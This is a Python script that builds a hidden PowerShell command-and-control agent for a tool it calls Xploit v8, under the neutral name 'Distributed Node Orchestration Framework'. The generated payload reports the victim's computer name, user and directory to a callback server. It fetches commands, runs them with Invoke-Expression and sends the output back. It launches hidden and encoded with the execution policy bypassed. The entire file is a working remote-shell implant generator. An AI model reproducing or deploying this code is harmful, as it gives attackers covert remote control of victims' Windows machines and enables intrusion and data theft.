#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — Generator (v8 compatible)

Generates a Base64-encoded PowerShell payload exactly matching
main.py for X-Session-ID polling.
"""

import argparse
import base64

PATH_SEP = "---PATH_SEP---"


def generate_ps_payload(url: str) -> str:
    """
    Compact single-string PS agent — no backtick line-continuation.
    Now captures X-Session-ID from the check-in response and sends it
    on all subsequent requests so the server can route tasks correctly.
    Falls back to IP-based routing if header is absent (old-server compat).
    """
    ps = (
        f"$currentPath=$PWD.Path;"
        f"$info=\"$env:COMPUTERNAME|\"+$(whoami).Trim()+\"|$currentPath\";"
        f"$b64=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info));"
        f"$sid='';"
        "$gH=@{\"ngrok-skip-browser-warning\"=\"true\"};"
        f"try{{$cr=Invoke-WebRequest -Uri '{url}/checkin' -Method Post -Body $b64 -ContentType 'text/plain' -Headers $gH -UseBasicParsing;"
        f"if($cr.Headers['X-Session-ID']){{$sid=$cr.Headers['X-Session-ID']}}}}catch{{}};"
        f"while($true){{"
        f"try{{"
        f"$h=@{{\"X-Agent-CWD\"=$currentPath;\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
        f"$r=Invoke-WebRequest -Uri '{url}/get_task' -Headers $h -UseBasicParsing;"
        f"$cmd=$r.Content.Trim();"
        f"if($cmd){{"
        f"$out=\"\";"
        f"if($cmd -match '^cd(\\s|$)'){{"
        f"$tgt=($cmd -replace '^cd\\s*','').Trim();"
        f"if($tgt -eq '' -or $tgt -eq '~'){{$tgt=$HOME}}"
        f"elseif(-not [System.IO.Path]::IsPathRooted($tgt)){{$tgt=Join-Path $currentPath $tgt}};"
        f"$tgt=$tgt.Replace('/','\\\\');"
        f"try{{Set-Location -LiteralPath $tgt;$currentPath=(Get-Location).Path;$out=\"[+] $currentPath\"}}catch{{$out=\"[-] cd failed: $_\"}}"
        f"}}else{{"
        f"Set-Location $currentPath;"
        f"try{{$out=Invoke-Expression $cmd 2>&1|Out-String;if(-not $out.Trim()){{$out='(no output)'}}}}catch{{$out=\"ERROR: $_\"}};"
        f"$currentPath=(Get-Location).Path"
        f"}};"
        f"$b64r=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out+'{PATH_SEP}'+$currentPath));"
        f"$sh=@{{\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
        f"Invoke-WebRequest -Uri '{url}/submit_result' -Method Post -Body $b64r -ContentType 'text/plain' -Headers $sh -UseBasicParsing|Out-Null"
        f"}}}}catch{{}};"
        f"Start-Sleep -Seconds 3"
        f"}}"
    )
    enc = base64.b64encode(ps.encode('utf-16le')).decode()
    return f"powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc {enc}"


def main():
    parser = argparse.ArgumentParser(
        description="Generate a PowerShell agent payload compatible with Xploit v8 HTTP."
    )
    parser.add_argument("--url", required=True, help="The callback URL, e.g. http://192.168.1.10:8080")
    args    = parser.parse_args()
    
    # Clean trailing slash if provided
    url = args.url if not args.url.endswith("/") else args.url[:-1]
    
    payload = generate_ps_payload(url)
    print(f"\n[*] C2: {url}")
    print("\n[+] Payload:\n")
    print(payload)
    print()


if __name__ == "__main__":
    main()
